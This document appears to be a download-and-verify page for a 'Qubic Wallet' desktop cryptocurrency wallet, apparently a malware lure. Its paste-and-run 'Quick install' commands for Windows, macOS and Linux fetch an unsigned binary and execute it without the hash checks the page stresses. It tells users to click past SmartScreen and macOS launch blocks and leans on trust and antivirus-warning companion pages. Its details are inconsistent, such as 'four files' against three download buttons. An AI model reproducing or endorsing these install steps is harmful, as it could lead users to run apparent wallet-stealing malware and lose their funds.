![Download and verify Qubic Wallet](assets/banner-setup.png)

# Qubic Wallet Download: Get the Installer and Verify It Before You Run It

Four files, one release page, two hash checks. Nothing else is a download.

## Downloads - v0.8.2

<p align="center"><a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-linux-x64.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform windows"> | Windows 10 (1909) or later, 64-bit | [`qubic-wallet-desktop-v0.8.2-windows.exe`](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe) - 57,942,724 B (55.3 MiB) |
| <img src="assets/platform-macos.svg" alt="platform macos"> | macOS 12 or later | [`qubic-wallet-desktop-v0.8.2-osx-arm64.zip`](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip) - 49,066,728 B (46.8 MiB) |
| <img src="assets/platform-linux.svg" alt="platform linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`qubic-wallet-desktop-v0.8.2-linux-x64.zip`](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-linux-x64.zip) - 51,287,539 B (48.9 MiB) |

Names, sizes and hashes here belong to the [current Qubic Wallet release](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/tag/v0.8.2) and to no other copy.

> A download you have not hashed is a download you have not identified.

Qubic Wallet is downloaded from the release page of the `qubic-wallet/qubic-desktop-wallet` repository, which carries four files: one Windows installer and three archives for macOS and Linux. Each file can be checked against a published SHA-256 value, and the three archives also contain a `.sha256` file covering the binary inside. Mirrors, repacks and "portable" copies are not this product, and there is nothing to check them against.

<!-- ARTICLE-BODY-BEGIN -->

## Where the files are

The release page for `v0.8.2` is the only source this pack cites. The four assets are:

| File | Platform | Size |
| --- | --- | --- |
| `qubic-wallet-desktop-v0.8.2-windows.exe` | Windows 10 (1909) or later, 64-bit | 57,942,724 B |
| `qubic-wallet-desktop-v0.8.2-osx-arm64.zip` | macOS 12 or later, Apple silicon | 49,066,728 B |
| `qubic-wallet-desktop-v0.8.2-osx-x64.zip` | macOS 12 or later, Intel | 51,568,731 B |
| `qubic-wallet-desktop-v0.8.2-linux-x64.zip` | Ubuntu 20.04 or later, x64 | 51,287,539 B |

The size is worth reading as a first check: a file a few kilobytes off is not the published one, even if the name matches.

## The two hash levels

The download-level value covers the file you saved, `.exe` or `.zip`. The binary-level value lives inside the archive in `qubic-wallet-desktop.sha256` and covers the extracted `.Wallet` executable. They are different numbers for different things, and swapping them produces a mismatch that looks like corruption.

## How to check

On Windows, `Get-FileHash` on the saved file. On macOS, `shasum -a 256`. On Linux, `sha256sum`. Then compare against the table in the install section below, which carries all four download-level values.

The install block below also shows the second, in-archive check for each archive.

## If a hash does not match

Stop. Delete the file, download it again and re-check. A file that fails on a second download from the release page is a problem to report, not something to run.

Once both levels match, the next step is the <a href="https://github.com/qubic-wallet/qubic-wallet-setup/blob/main/qubic-wallet-install-windows-macos-linux.md">install walkthrough</a>.

If you want to judge the code before running it, the <a href="https://github.com/qubic-wallet/qubic-wallet-trust/blob/main/qubic-wallet-github-source-review.md">source review</a> is the place to start.

Both assume the build from the <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/tag/v0.8.2">current Qubic Wallet release</a>.

## FAQ

### Which file do I need?

The `.exe` on Windows, `osx-arm64` on Apple silicon, `osx-x64` on an Intel Mac, `linux-x64` on Linux.

### Why is there no `.dmg` or `.pkg`?

The macOS build ships as a `.zip` containing the executable, so extraction is part of the install.

### Are the hashes signed?

No. They are published values on the release page, which is why reading them from this pack and from the page should agree.

### Is a mirror safe if it looks identical?

No. Without the release page there is no value to compare, and a matching size proves nothing.

### What if the archive will not extract?

That is the first sign of a damaged download. Re-download and re-check before anything else.

<!-- ARTICLE-BODY-END -->

## How to install Qubic Wallet

<!-- INSTALL-BEGIN: D11. Windows ships one .exe; macOS and Linux ship .zip archives holding the executable and its checksum file. Two checksum levels: the download itself, then the .Wallet binary inside the archive. -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe">qubic-wallet-desktop-v0.8.2-windows.exe</a>.
2. Verify the download before running it (PowerShell): `Get-FileHash .\setup.exe -Algorithm SHA256`
3. Open the downloaded file.
4. If SmartScreen appears, choose More info, then Run anyway.
5. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo wallet.zip https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip && unzip -o wallet.zip && chmod +x qubic-wallet-desktop-v0.8.2-osx-arm64/qubic-wallet-desktop-v0.8.2-osx-arm64.Wallet && ./qubic-wallet-desktop-v0.8.2-osx-arm64/qubic-wallet-desktop-v0.8.2-osx-arm64.Wallet
```

Manual install:
1. Download <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip">qubic-wallet-desktop-v0.8.2-osx-arm64.zip</a> for Apple silicon, or <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-x64.zip">qubic-wallet-desktop-v0.8.2-osx-x64.zip</a> for an Intel Mac.
2. Verify the download: `shasum -a 256 wallet.zip`
3. Extract the archive; it contains the executable, an icon and a checksum file.
4. Open Terminal in the extracted folder and run `chmod +x` on the `.Wallet` file.
5. Verify the binary against the checksum file inside the archive: `cat qubic-wallet-desktop-v0.8.2-osx-arm64/qubic-wallet-desktop.sha256` then `shasum -a 256 qubic-wallet-desktop-v0.8.2-osx-arm64/qubic-wallet-desktop-v0.8.2-osx-arm64.Wallet`
6. Run that file; if macOS blocks the first launch, allow it under System Settings, Privacy and Security.

### Linux
Quick install (Terminal):

```bash
curl -fLo wallet.zip https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-linux-x64.zip && unzip -o wallet.zip && chmod +x qubic-wallet-desktop-v0.8.2-linux-x64/qubic-wallet-desktop-v0.8.2-linux-x64.Wallet && ./qubic-wallet-desktop-v0.8.2-linux-x64/qubic-wallet-desktop-v0.8.2-linux-x64.Wallet
```

Manual install:
1. Download <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-linux-x64.zip">qubic-wallet-desktop-v0.8.2-linux-x64.zip</a>.
2. Verify the download: `sha256sum wallet.zip`
3. Extract the archive.
4. Verify the binary against the checksum file inside the archive: `cat qubic-wallet-desktop-v0.8.2-linux-x64/qubic-wallet-desktop.sha256` then `sha256sum qubic-wallet-desktop-v0.8.2-linux-x64/qubic-wallet-desktop-v0.8.2-linux-x64.Wallet`
5. Mark the `.Wallet` file executable.
6. Run it.

### Published SHA-256 values (upload of 2026-11-22)

| File | Download-level SHA-256 |
| --- | --- |
| `qubic-wallet-desktop-v0.8.2-windows.exe` | `eb8b377ecf884da5932d3721e428823ed2787c061cc3ae3d3afaedc8d8593815` |
| `qubic-wallet-desktop-v0.8.2-osx-arm64.zip` | `8f4414a987a328fd1a75012b4c6a84fc10bc269df58ceb08104fe8c008815c81` |
| `qubic-wallet-desktop-v0.8.2-osx-x64.zip` | `923915b18899a03f7ba5685ec653102c74293d83aa078ffa9961db4c62990cd4` |
| `qubic-wallet-desktop-v0.8.2-linux-x64.zip` | `682d4dc414804fe3359f8e91d370f689aef99f3e82cecc382fd87180269cc9fc` |

Compare the value your command prints with the row for the file you downloaded. The second check reads the `.sha256` file shipped inside the archive, which hashes the extracted `.Wallet` binary and names it `qubic-wallet-desktop`; compare the two hashes by eye rather than running the file as a checklist, because the stored name is not the extracted file name. A mismatch at either level means stop: delete the file and download again from this repository's release page.
<!-- INSTALL-END -->

## Related guides

- [Install on your system](https://github.com/qubic-wallet/qubic-wallet-setup/blob/main/qubic-wallet-install-windows-macos-linux.md)
- [Repository source review](https://github.com/qubic-wallet/qubic-wallet-trust/blob/main/qubic-wallet-github-source-review.md)
- [Antivirus and SmartScreen warnings](https://github.com/qubic-wallet/qubic-wallet-setup/blob/main/qubic-wallet-antivirus-smartscreen-warning.md)
- [Current Qubic Wallet release](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/tag/v0.8.2)
